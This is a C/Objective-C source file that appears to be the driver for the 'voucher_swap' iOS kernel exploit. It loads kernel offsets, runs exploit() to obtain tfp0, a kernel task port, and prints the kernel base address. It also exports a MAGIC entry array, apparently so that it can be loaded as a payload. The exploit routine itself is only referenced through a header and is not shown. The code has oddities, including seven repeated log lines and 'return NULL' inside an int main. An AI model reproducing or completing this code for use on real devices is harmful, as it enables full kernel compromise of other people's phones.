#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <Foundation/Foundation.h>
#include "common.h"
#include "voucher_swap.h"

#define LOG(msg) \
  NSLog(@msg); \
  fprintf(stderr, msg); \
  fflush(stderr); \

int main() {
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
  LOG("Starting...\n");
    kern_return_t ret;
    
    offsets_t *offs = get_offsets();
    if (offs == NULL)
    {
        LOG("failed to get offsets!");
        return NULL;
    }
    
    mach_port_t tfp0;
    uint64_t kernel_base;
    ret = exploit(offs, &tfp0, &kernel_base);
    if (ret != KERN_SUCCESS)
    {
        printf("failed to run exploit: %x %s\n", ret, mach_error_string(ret));
        return NULL;
    }
    printf("success!\n");
    printf("tfp0: %x\n", tfp0);
    printf("kernel base: 0x%llx\n", kernel_base);
  return 0;
}


uint64_t entry[] = { MAGIC, (uint64_t)&main };
